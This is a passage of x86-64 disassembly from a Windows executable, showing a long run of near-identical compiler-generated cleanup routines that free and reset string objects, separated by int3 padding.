   140009bed:	cc                   	int3
   140009bee:	cc                   	int3
   140009bef:	cc                   	int3
   140009bf0:	48 83 ec 38          	sub    $0x38,%rsp
   140009bf4:	48 8b 15 75 68 01 00 	mov    0x16875(%rip),%rdx        # 0x140020470
   140009bfb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009bff:	76 30                	jbe    0x140009c31
   140009c01:	48 8b 0d 50 68 01 00 	mov    0x16850(%rip),%rcx        # 0x140020458
   140009c08:	48 ff c2             	inc    %rdx
   140009c0b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009c12:	72 18                	jb     0x140009c2c
   140009c14:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009c18:	48 83 c2 27          	add    $0x27,%rdx
   140009c1c:	48 2b c8             	sub    %rax,%rcx
   140009c1f:	48 83 e9 08          	sub    $0x8,%rcx
   140009c23:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009c27:	77 24                	ja     0x140009c4d
   140009c29:	48 8b c8             	mov    %rax,%rcx
   140009c2c:	e8 6b ee ff ff       	call   0x140008a9c
   140009c31:	66 0f 6f 05 b7 4e 00 	movdqa 0x4eb7(%rip),%xmm0        # 0x14000eaf0
   140009c38:	00 
   140009c39:	f3 0f 7f 05 27 68 01 	movdqu %xmm0,0x16827(%rip)        # 0x140020468
   140009c40:	00 
   140009c41:	c6 05 10 68 01 00 00 	movb   $0x0,0x16810(%rip)        # 0x140020458
   140009c48:	48 83 c4 38          	add    $0x38,%rsp
   140009c4c:	c3                   	ret
   140009c4d:	45 33 c9             	xor    %r9d,%r9d
   140009c50:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009c57:	00 00 
   140009c59:	45 33 c0             	xor    %r8d,%r8d
   140009c5c:	33 d2                	xor    %edx,%edx
   140009c5e:	33 c9                	xor    %ecx,%ecx
   140009c60:	ff 15 ea 16 00 00    	call   *0x16ea(%rip)        # 0x14000b350
   140009c66:	cc                   	int3
   140009c67:	cc                   	int3
   140009c68:	cc                   	int3
   140009c69:	cc                   	int3
   140009c6a:	cc                   	int3
   140009c6b:	cc                   	int3
   140009c6c:	cc                   	int3
   140009c6d:	cc                   	int3
   140009c6e:	cc                   	int3
   140009c6f:	cc                   	int3
   140009c70:	48 83 ec 38          	sub    $0x38,%rsp
   140009c74:	48 8b 15 95 68 01 00 	mov    0x16895(%rip),%rdx        # 0x140020510
   140009c7b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009c7f:	76 30                	jbe    0x140009cb1
   140009c81:	48 8b 0d 70 68 01 00 	mov    0x16870(%rip),%rcx        # 0x1400204f8
   140009c88:	48 ff c2             	inc    %rdx
   140009c8b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009c92:	72 18                	jb     0x140009cac
   140009c94:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009c98:	48 83 c2 27          	add    $0x27,%rdx
   140009c9c:	48 2b c8             	sub    %rax,%rcx
   140009c9f:	48 83 e9 08          	sub    $0x8,%rcx
   140009ca3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009ca7:	77 24                	ja     0x140009ccd
   140009ca9:	48 8b c8             	mov    %rax,%rcx
   140009cac:	e8 eb ed ff ff       	call   0x140008a9c
   140009cb1:	66 0f 6f 05 37 4e 00 	movdqa 0x4e37(%rip),%xmm0        # 0x14000eaf0
   140009cb8:	00 
   140009cb9:	f3 0f 7f 05 47 68 01 	movdqu %xmm0,0x16847(%rip)        # 0x140020508
   140009cc0:	00 
   140009cc1:	c6 05 30 68 01 00 00 	movb   $0x0,0x16830(%rip)        # 0x1400204f8
   140009cc8:	48 83 c4 38          	add    $0x38,%rsp
   140009ccc:	c3                   	ret
   140009ccd:	45 33 c9             	xor    %r9d,%r9d
   140009cd0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009cd7:	00 00 
   140009cd9:	45 33 c0             	xor    %r8d,%r8d
   140009cdc:	33 d2                	xor    %edx,%edx
   140009cde:	33 c9                	xor    %ecx,%ecx
   140009ce0:	ff 15 6a 16 00 00    	call   *0x166a(%rip)        # 0x14000b350
   140009ce6:	cc                   	int3
   140009ce7:	cc                   	int3
   140009ce8:	cc                   	int3
   140009ce9:	cc                   	int3
   140009cea:	cc                   	int3
   140009ceb:	cc                   	int3
   140009cec:	cc                   	int3
   140009ced:	cc                   	int3
   140009cee:	cc                   	int3
   140009cef:	cc                   	int3
   140009cf0:	48 83 ec 38          	sub    $0x38,%rsp
   140009cf4:	48 8b 15 f5 68 01 00 	mov    0x168f5(%rip),%rdx        # 0x1400205f0
   140009cfb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009cff:	76 30                	jbe    0x140009d31
   140009d01:	48 8b 0d d0 68 01 00 	mov    0x168d0(%rip),%rcx        # 0x1400205d8
   140009d08:	48 ff c2             	inc    %rdx
   140009d0b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009d12:	72 18                	jb     0x140009d2c
   140009d14:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009d18:	48 83 c2 27          	add    $0x27,%rdx
   140009d1c:	48 2b c8             	sub    %rax,%rcx
   140009d1f:	48 83 e9 08          	sub    $0x8,%rcx
   140009d23:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009d27:	77 24                	ja     0x140009d4d
   140009d29:	48 8b c8             	mov    %rax,%rcx
   140009d2c:	e8 6b ed ff ff       	call   0x140008a9c
   140009d31:	66 0f 6f 05 b7 4d 00 	movdqa 0x4db7(%rip),%xmm0        # 0x14000eaf0
   140009d38:	00 
   140009d39:	f3 0f 7f 05 a7 68 01 	movdqu %xmm0,0x168a7(%rip)        # 0x1400205e8
   140009d40:	00 
   140009d41:	c6 05 90 68 01 00 00 	movb   $0x0,0x16890(%rip)        # 0x1400205d8
   140009d48:	48 83 c4 38          	add    $0x38,%rsp
   140009d4c:	c3                   	ret
   140009d4d:	45 33 c9             	xor    %r9d,%r9d
   140009d50:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009d57:	00 00 
   140009d59:	45 33 c0             	xor    %r8d,%r8d
   140009d5c:	33 d2                	xor    %edx,%edx
   140009d5e:	33 c9                	xor    %ecx,%ecx
   140009d60:	ff 15 ea 15 00 00    	call   *0x15ea(%rip)        # 0x14000b350
   140009d66:	cc                   	int3
   140009d67:	cc                   	int3
   140009d68:	cc                   	int3
   140009d69:	cc                   	int3
   140009d6a:	cc                   	int3
   140009d6b:	cc                   	int3
   140009d6c:	cc                   	int3
   140009d6d:	cc                   	int3
   140009d6e:	cc                   	int3
   140009d6f:	cc                   	int3
   140009d70:	48 83 ec 38          	sub    $0x38,%rsp
   140009d74:	48 8b 15 d5 67 01 00 	mov    0x167d5(%rip),%rdx        # 0x140020550
   140009d7b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009d7f:	76 30                	jbe    0x140009db1
   140009d81:	48 8b 0d b0 67 01 00 	mov    0x167b0(%rip),%rcx        # 0x140020538
   140009d88:	48 ff c2             	inc    %rdx
   140009d8b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009d92:	72 18                	jb     0x140009dac
   140009d94:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009d98:	48 83 c2 27          	add    $0x27,%rdx
   140009d9c:	48 2b c8             	sub    %rax,%rcx
   140009d9f:	48 83 e9 08          	sub    $0x8,%rcx
   140009da3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009da7:	77 24                	ja     0x140009dcd
   140009da9:	48 8b c8             	mov    %rax,%rcx
   140009dac:	e8 eb ec ff ff       	call   0x140008a9c
   140009db1:	66 0f 6f 05 37 4d 00 	movdqa 0x4d37(%rip),%xmm0        # 0x14000eaf0
   140009db8:	00 
   140009db9:	f3 0f 7f 05 87 67 01 	movdqu %xmm0,0x16787(%rip)        # 0x140020548
   140009dc0:	00 
   140009dc1:	c6 05 70 67 01 00 00 	movb   $0x0,0x16770(%rip)        # 0x140020538
   140009dc8:	48 83 c4 38          	add    $0x38,%rsp
   140009dcc:	c3                   	ret
   140009dcd:	45 33 c9             	xor    %r9d,%r9d
   140009dd0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009dd7:	00 00 
   140009dd9:	45 33 c0             	xor    %r8d,%r8d
   140009ddc:	33 d2                	xor    %edx,%edx
   140009dde:	33 c9                	xor    %ecx,%ecx
   140009de0:	ff 15 6a 15 00 00    	call   *0x156a(%rip)        # 0x14000b350
   140009de6:	cc                   	int3
   140009de7:	cc                   	int3
   140009de8:	cc                   	int3
   140009de9:	cc                   	int3
   140009dea:	cc                   	int3
   140009deb:	cc                   	int3
   140009dec:	cc                   	int3
   140009ded:	cc                   	int3
   140009dee:	cc                   	int3
   140009def:	cc                   	int3
   140009df0:	48 83 ec 38          	sub    $0x38,%rsp
   140009df4:	48 8b 15 b5 67 01 00 	mov    0x167b5(%rip),%rdx        # 0x1400205b0
   140009dfb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009dff:	76 30                	jbe    0x140009e31
   140009e01:	48 8b 0d 90 67 01 00 	mov    0x16790(%rip),%rcx        # 0x140020598
   140009e08:	48 ff c2             	inc    %rdx
   140009e0b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009e12:	72 18                	jb     0x140009e2c
   140009e14:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009e18:	48 83 c2 27          	add    $0x27,%rdx
   140009e1c:	48 2b c8             	sub    %rax,%rcx
   140009e1f:	48 83 e9 08          	sub    $0x8,%rcx
   140009e23:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009e27:	77 24                	ja     0x140009e4d
   140009e29:	48 8b c8             	mov    %rax,%rcx
   140009e2c:	e8 6b ec ff ff       	call   0x140008a9c
   140009e31:	66 0f 6f 05 b7 4c 00 	movdqa 0x4cb7(%rip),%xmm0        # 0x14000eaf0
   140009e38:	00 
   140009e39:	f3 0f 7f 05 67 67 01 	movdqu %xmm0,0x16767(%rip)        # 0x1400205a8
   140009e40:	00 
   140009e41:	c6 05 50 67 01 00 00 	movb   $0x0,0x16750(%rip)        # 0x140020598
   140009e48:	48 83 c4 38          	add    $0x38,%rsp
   140009e4c:	c3                   	ret
   140009e4d:	45 33 c9             	xor    %r9d,%r9d
   140009e50:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009e57:	00 00 
   140009e59:	45 33 c0             	xor    %r8d,%r8d
   140009e5c:	33 d2                	xor    %edx,%edx
   140009e5e:	33 c9                	xor    %ecx,%ecx
   140009e60:	ff 15 ea 14 00 00    	call   *0x14ea(%rip)        # 0x14000b350
   140009e66:	cc                   	int3
   140009e67:	cc                   	int3
   140009e68:	cc                   	int3
   140009e69:	cc                   	int3
   140009e6a:	cc                   	int3
   140009e6b:	cc                   	int3
   140009e6c:	cc                   	int3
   140009e6d:	cc                   	int3
   140009e6e:	cc                   	int3
   140009e6f:	cc                   	int3
   140009e70:	48 83 ec 38          	sub    $0x38,%rsp
   140009e74:	48 8b 15 35 66 01 00 	mov    0x16635(%rip),%rdx        # 0x1400204b0
   140009e7b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009e7f:	76 30                	jbe    0x140009eb1
   140009e81:	48 8b 0d 10 66 01 00 	mov    0x16610(%rip),%rcx        # 0x140020498
   140009e88:	48 ff c2             	inc    %rdx
   140009e8b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009e92:	72 18                	jb     0x140009eac
   140009e94:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009e98:	48 83 c2 27          	add    $0x27,%rdx
   140009e9c:	48 2b c8             	sub    %rax,%rcx
   140009e9f:	48 83 e9 08          	sub    $0x8,%rcx
   140009ea3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009ea7:	77 24                	ja     0x140009ecd
   140009ea9:	48 8b c8             	mov    %rax,%rcx
   140009eac:	e8 eb eb ff ff       	call   0x140008a9c
   140009eb1:	66 0f 6f 05 37 4c 00 	movdqa 0x4c37(%rip),%xmm0        # 0x14000eaf0
   140009eb8:	00 
   140009eb9:	f3 0f 7f 05 e7 65 01 	movdqu %xmm0,0x165e7(%rip)        # 0x1400204a8
   140009ec0:	00 
   140009ec1:	c6 05 d0 65 01 00 00 	movb   $0x0,0x165d0(%rip)        # 0x140020498
   140009ec8:	48 83 c4 38          	add    $0x38,%rsp
   140009ecc:	c3                   	ret
   140009ecd:	45 33 c9             	xor    %r9d,%r9d
   140009ed0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009ed7:	00 00 
   140009ed9:	45 33 c0             	xor    %r8d,%r8d
   140009edc:	33 d2                	xor    %edx,%edx
   140009ede:	33 c9                	xor    %ecx,%ecx
   140009ee0:	ff 15 6a 14 00 00    	call   *0x146a(%rip)        # 0x14000b350
   140009ee6:	cc                   	int3
   140009ee7:	cc                   	int3
   140009ee8:	cc                   	int3
   140009ee9:	cc                   	int3
   140009eea:	cc                   	int3
   140009eeb:	cc                   	int3
   140009eec:	cc                   	int3
   140009eed:	cc                   	int3
   140009eee:	cc                   	int3
   140009eef:	cc                   	int3
   140009ef0:	48 83 ec 38          	sub    $0x38,%rsp
   140009ef4:	48 8b 15 75 66 01 00 	mov    0x16675(%rip),%rdx        # 0x140020570
   140009efb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009eff:	76 30                	jbe    0x140009f31
   140009f01:	48 8b 0d 50 66 01 00 	mov    0x16650(%rip),%rcx        # 0x140020558
   140009f08:	48 ff c2             	inc    %rdx
   140009f0b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009f12:	72 18                	jb     0x140009f2c
   140009f14:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009f18:	48 83 c2 27          	add    $0x27,%rdx
   140009f1c:	48 2b c8             	sub    %rax,%rcx
   140009f1f:	48 83 e9 08          	sub    $0x8,%rcx
   140009f23:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009f27:	77 24                	ja     0x140009f4d
   140009f29:	48 8b c8             	mov    %rax,%rcx
   140009f2c:	e8 6b eb ff ff       	call   0x140008a9c
   140009f31:	66 0f 6f 05 b7 4b 00 	movdqa 0x4bb7(%rip),%xmm0        # 0x14000eaf0
   140009f38:	00 
   140009f39:	f3 0f 7f 05 27 66 01 	movdqu %xmm0,0x16627(%rip)        # 0x140020568
   140009f40:	00 
   140009f41:	c6 05 10 66 01 00 00 	movb   $0x0,0x16610(%rip)        # 0x140020558
   140009f48:	48 83 c4 38          	add    $0x38,%rsp
   140009f4c:	c3                   	ret
   140009f4d:	45 33 c9             	xor    %r9d,%r9d
   140009f50:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009f57:	00 00 
   140009f59:	45 33 c0             	xor    %r8d,%r8d
   140009f5c:	33 d2                	xor    %edx,%edx
   140009f5e:	33 c9                	xor    %ecx,%ecx
   140009f60:	ff 15 ea 13 00 00    	call   *0x13ea(%rip)        # 0x14000b350
   140009f66:	cc                   	int3
   140009f67:	cc                   	int3
   140009f68:	cc                   	int3
   140009f69:	cc                   	int3
   140009f6a:	cc                   	int3
   140009f6b:	cc                   	int3
   140009f6c:	cc                   	int3
   140009f6d:	cc                   	int3
   140009f6e:	cc                   	int3
   140009f6f:	cc                   	int3
   140009f70:	48 83 ec 38          	sub    $0x38,%rsp
   140009f74:	48 8b 15 15 65 01 00 	mov    0x16515(%rip),%rdx        # 0x140020490
   140009f7b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009f7f:	76 30                	jbe    0x140009fb1
   140009f81:	48 8b 0d f0 64 01 00 	mov    0x164f0(%rip),%rcx        # 0x140020478
   140009f88:	48 ff c2             	inc    %rdx
   140009f8b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009f92:	72 18                	jb     0x140009fac
   140009f94:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009f98:	48 83 c2 27          	add    $0x27,%rdx
   140009f9c:	48 2b c8             	sub    %rax,%rcx
   140009f9f:	48 83 e9 08          	sub    $0x8,%rcx
   140009fa3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009fa7:	77 24                	ja     0x140009fcd
   140009fa9:	48 8b c8             	mov    %rax,%rcx
   140009fac:	e8 eb ea ff ff       	call   0x140008a9c
   140009fb1:	66 0f 6f 05 37 4b 00 	movdqa 0x4b37(%rip),%xmm0        # 0x14000eaf0
   140009fb8:	00 
   140009fb9:	f3 0f 7f 05 c7 64 01 	movdqu %xmm0,0x164c7(%rip)        # 0x140020488
   140009fc0:	00 
   140009fc1:	c6 05 b0 64 01 00 00 	movb   $0x0,0x164b0(%rip)        # 0x140020478
   140009fc8:	48 83 c4 38          	add    $0x38,%rsp
   140009fcc:	c3                   	ret
   140009fcd:	45 33 c9             	xor    %r9d,%r9d
   140009fd0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009fd7:	00 00 
   140009fd9:	45 33 c0             	xor    %r8d,%r8d
   140009fdc:	33 d2                	xor    %edx,%edx
   140009fde:	33 c9                	xor    %ecx,%ecx
   140009fe0:	ff 15 6a 13 00 00    	call   *0x136a(%rip)        # 0x14000b350
   140009fe6:	cc                   	int3
   140009fe7:	cc                   	int3
   140009fe8:	cc                   	int3
   140009fe9:	cc                   	int3
   140009fea:	cc                   	int3
   140009feb:	cc                   	int3
   140009fec:	cc                   	int3
   140009fed:	cc                   	int3
   140009fee:	cc                   	int3
   140009fef:	cc                   	int3
   140009ff0:	48 83 ec 38          	sub    $0x38,%rsp
   140009ff4:	48 8b 15 d5 65 01 00 	mov    0x165d5(%rip),%rdx        # 0x1400205d0
   140009ffb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009fff:	76 30                	jbe    0x14000a031
   14000a001:	48 8b 0d b0 65 01 00 	mov    0x165b0(%rip),%rcx        # 0x1400205b8
   14000a008:	48 ff c2             	inc    %rdx
   14000a00b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a012:	72 18                	jb     0x14000a02c
   14000a014:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a018:	48 83 c2 27          	add    $0x27,%rdx
   14000a01c:	48 2b c8             	sub    %rax,%rcx
   14000a01f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a023:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a027:	77 24                	ja     0x14000a04d
   14000a029:	48 8b c8             	mov    %rax,%rcx
   14000a02c:	e8 6b ea ff ff       	call   0x140008a9c
   14000a031:	66 0f 6f 05 b7 4a 00 	movdqa 0x4ab7(%rip),%xmm0        # 0x14000eaf0
   14000a038:	00 
   14000a039:	f3 0f 7f 05 87 65 01 	movdqu %xmm0,0x16587(%rip)        # 0x1400205c8
   14000a040:	00 
   14000a041:	c6 05 70 65 01 00 00 	movb   $0x0,0x16570(%rip)        # 0x1400205b8
   14000a048:	48 83 c4 38          	add    $0x38,%rsp
   14000a04c:	c3                   	ret
   14000a04d:	45 33 c9             	xor    %r9d,%r9d
   14000a050:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a057:	00 00 
   14000a059:	45 33 c0             	xor    %r8d,%r8d
   14000a05c:	33 d2                	xor    %edx,%edx
   14000a05e:	33 c9                	xor    %ecx,%ecx
   14000a060:	ff 15 ea 12 00 00    	call   *0x12ea(%rip)        # 0x14000b350
   14000a066:	cc                   	int3
   14000a067:	cc                   	int3
   14000a068:	cc                   	int3
   14000a069:	cc                   	int3
   14000a06a:	cc                   	int3
   14000a06b:	cc                   	int3
   14000a06c:	cc                   	int3
   14000a06d:	cc                   	int3
   14000a06e:	cc                   	int3
   14000a06f:	cc                   	int3
   14000a070:	48 83 ec 38          	sub    $0x38,%rsp
   14000a074:	48 8b 15 b5 64 01 00 	mov    0x164b5(%rip),%rdx        # 0x140020530
   14000a07b:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000a07f:	76 30                	jbe    0x14000a0b1
   14000a081:	48 8b 0d 90 64 01 00 	mov    0x16490(%rip),%rcx        # 0x140020518
   14000a088:	48 ff c2             	inc    %rdx
   14000a08b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a092:	72 18                	jb     0x14000a0ac
   14000a094:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a098:	48 83 c2 27          	add    $0x27,%rdx
   14000a09c:	48 2b c8             	sub    %rax,%rcx
   14000a09f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a0a3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a0a7:	77 24                	ja     0x14000a0cd
   14000a0a9:	48 8b c8             	mov    %rax,%rcx
   14000a0ac:	e8 eb e9 ff ff       	call   0x140008a9c
   14000a0b1:	66 0f 6f 05 37 4a 00 	movdqa 0x4a37(%rip),%xmm0        # 0x14000eaf0
   14000a0b8:	00 
   14000a0b9:	f3 0f 7f 05 67 64 01 	movdqu %xmm0,0x16467(%rip)        # 0x140020528
   14000a0c0:	00 
   14000a0c1:	c6 05 50 64 01 00 00 	movb   $0x0,0x16450(%rip)        # 0x140020518
   14000a0c8:	48 83 c4 38          	add    $0x38,%rsp
   14000a0cc:	c3                   	ret
   14000a0cd:	45 33 c9             	xor    %r9d,%r9d
   14000a0d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a0d7:	00 00 
   14000a0d9:	45 33 c0             	xor    %r8d,%r8d
   14000a0dc:	33 d2                	xor    %edx,%edx
   14000a0de:	33 c9                	xor    %ecx,%ecx
   14000a0e0:	ff 15 6a 12 00 00    	call   *0x126a(%rip)        # 0x14000b350
   14000a0e6:	cc                   	int3
   14000a0e7:	cc                   	int3
   14000a0e8:	cc                   	int3
   14000a0e9:	cc                   	int3
   14000a0ea:	cc                   	int3
   14000a0eb:	cc                   	int3
   14000a0ec:	cc                   	int3
   14000a0ed:	cc                   	int3
   14000a0ee:	cc                   	int3
   14000a0ef:	cc                   	int3
   14000a0f0:	48 83 ec 38          	sub    $0x38,%rsp
   14000a0f4:	48 8b 15 f5 63 01 00 	mov    0x163f5(%rip),%rdx        # 0x1400204f0
   14000a0fb:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000a0ff:	76 30                	jbe    0x14000a131
   14000a101:	48 8b 0d d0 63 01 00 	mov    0x163d0(%rip),%rcx        # 0x1400204d8
   14000a108:	48 ff c2             	inc    %rdx
   14000a10b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a112:	72 18                	jb     0x14000a12c
   14000a114:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a118:	48 83 c2 27          	add    $0x27,%rdx
   14000a11c:	48 2b c8             	sub    %rax,%rcx
   14000a11f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a123:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a127:	77 24                	ja     0x14000a14d
   14000a129:	48 8b c8             	mov    %rax,%rcx
   14000a12c:	e8 6b e9 ff ff       	call   0x140008a9c
   14000a131:	66 0f 6f 05 b7 49 00 	movdqa 0x49b7(%rip),%xmm0        # 0x14000eaf0
   14000a138:	00 
   14000a139:	f3 0f 7f 05 a7 63 01 	movdqu %xmm0,0x163a7(%rip)        # 0x1400204e8
   14000a140:	00 
   14000a141:	c6 05 90 63 01 00 00 	movb   $0x0,0x16390(%rip)        # 0x1400204d8
   14000a148:	48 83 c4 38          	add    $0x38,%rsp
   14000a14c:	c3                   	ret
   14000a14d:	45 33 c9             	xor    %r9d,%r9d
   14000a150:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a157:	00 00 
   14000a159:	45 33 c0             	xor    %r8d,%r8d
   14000a15c:	33 d2                	xor    %edx,%edx
   14000a15e:	33 c9                	xor    %ecx,%ecx
   14000a160:	ff 15 ea 11 00 00    	call   *0x11ea(%rip)        # 0x14000b350
   14000a166:	cc                   	int3
   14000a167:	cc                   	int3
   14000a168:	cc                   	int3
   14000a169:	cc                   	int3
   14000a16a:	cc                   	int3
   14000a16b:	cc                   	int3
   14000a16c:	cc                   	int3
   14000a16d:	cc                   	int3
   14000a16e:	cc                   	int3
   14000a16f:	cc                   	int3
   14000a170:	48 83 ec 38          	sub    $0x38,%rsp
   14000a174:	48 8b 15 15 64 01 00 	mov    0x16415(%rip),%rdx        # 0x140020590
   14000a17b:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000a17f:	76 30                	jbe    0x14000a1b1
   14000a181:	48 8b 0d f0 63 01 00 	mov    0x163f0(%rip),%rcx        # 0x140020578
   14000a188:	48 ff c2             	inc    %rdx
   14000a18b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a192:	72 18                	jb     0x14000a1ac
   14000a194:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a198:	48 83 c2 27          	add    $0x27,%rdx
   14000a19c:	48 2b c8             	sub    %rax,%rcx
   14000a19f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a1a3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a1a7:	77 24                	ja     0x14000a1cd
   14000a1a9:	48 8b c8             	mov    %rax,%rcx
   14000a1ac:	e8 eb e8 ff ff       	call   0x140008a9c
   14000a1b1:	66 0f 6f 05 37 49 00 	movdqa 0x4937(%rip),%xmm0        # 0x14000eaf0
   14000a1b8:	00 
   14000a1b9:	f3 0f 7f 05 c7 63 01 	movdqu %xmm0,0x163c7(%rip)        # 0x140020588
   14000a1c0:	00 
   14000a1c1:	c6 05 b0 63 01 00 00 	movb   $0x0,0x163b0(%rip)        # 0x140020578
   14000a1c8:	48 83 c4 38          	add    $0x38,%rsp
   14000a1cc:	c3                   	ret
   14000a1cd:	45 33 c9             	xor    %r9d,%r9d
   14000a1d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a1d7:	00 00 
   14000a1d9:	45 33 c0             	xor    %r8d,%r8d
   14000a1dc:	33 d2                	xor    %edx,%edx
   14000a1de:	33 c9                	xor    %ecx,%ecx
   14000a1e0:	ff 15 6a 11 00 00    	call   *0x116a(%rip)        # 0x14000b350
   14000a1e6:	cc                   	int3
   14000a1e7:	cc                   	int3
   14000a1e8:	cc                   	int3
   14000a1e9:	cc                   	int3
   14000a1ea:	cc                   	int3
   14000a1eb:	cc                   	int3
   14000a1ec:	cc                   	int3
   14000a1ed:	cc                   	int3
   14000a1ee:	cc                   	int3
   14000a1ef:	cc                   	int3
   14000a1f0:	48 83 ec 38          	sub    $0x38,%rsp
   14000a1f4:	48 8b 15 d5 62 01 00 	mov    0x162d5(%rip),%rdx        # 0x1400204d0
   14000a1fb:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000a1ff:	76 30                	jbe    0x14000a231
   14000a201:	48 8b 0d b0 62 01 00 	mov    0x162b0(%rip),%rcx        # 0x1400204b8
   14000a208:	48 ff c2             	inc    %rdx
   14000a20b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a212:	72 18                	jb     0x14000a22c
   14000a214:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a218:	48 83 c2 27          	add    $0x27,%rdx
   14000a21c:	48 2b c8             	sub    %rax,%rcx
   14000a21f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a223:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a227:	77 24                	ja     0x14000a24d
   14000a229:	48 8b c8             	mov    %rax,%rcx
   14000a22c:	e8 6b e8 ff ff       	call   0x140008a9c
   14000a231:	66 0f 6f 05 b7 48 00 	movdqa 0x48b7(%rip),%xmm0        # 0x14000eaf0
   14000a238:	00 
   14000a239:	f3 0f 7f 05 87 62 01 	movdqu %xmm0,0x16287(%rip)        # 0x1400204c8
   14000a240:	00 
   14000a241:	c6 05 70 62 01 00 00 	movb   $0x0,0x16270(%rip)        # 0x1400204b8
   14000a248:	48 83 c4 38          	add    $0x38,%rsp
   14000a24c:	c3                   	ret
   14000a24d:	45 33 c9             	xor    %r9d,%r9d
   14000a250:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a257:	00 00 
   14000a259:	45 33 c0             	xor    %r8d,%r8d
   14000a25c:	33 d2                	xor    %edx,%edx
   14000a25e:	33 c9                	xor    %ecx,%ecx
   14000a260:	ff 15 ea 10 00 00    	call   *0x10ea(%rip)        # 0x14000b350
   14000a266:	cc                   	int3
   14000a267:	cc                   	int3
   14000a268:	cc                   	int3
   14000a269:	cc                   	int3
   14000a26a:	cc                   	int3
   14000a26b:	cc                   	int3
   14000a26c:	cc                   	int3
   14000a26d:	cc                   	int3
   14000a26e:	cc                   	int3
   14000a26f:	cc                   	int3
   14000a270:	48 83 ec 38          	sub    $0x38,%rsp
   14000a274:	48 8b 15 6d 58 01 00 	mov    0x1586d(%rip),%rdx        # 0x14001fae8
   14000a27b:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000a27f:	76 30                	jbe    0x14000a2b1
   14000a281:	48 8b 0d 48 58 01 00 	mov    0x15848(%rip),%rcx        # 0x14001fad0
   14000a288:	48 ff c2             	inc    %rdx
   14000a28b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000a292:	72 18                	jb     0x14000a2ac
   14000a294:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000a298:	48 83 c2 27          	add    $0x27,%rdx
   14000a29c:	48 2b c8             	sub    %rax,%rcx
   14000a29f:	48 83 e9 08          	sub    $0x8,%rcx
   14000a2a3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a2a7:	77 24                	ja     0x14000a2cd
   14000a2a9:	48 8b c8             	mov    %rax,%rcx
   14000a2ac:	e8 eb e7 ff ff       	call   0x140008a9c
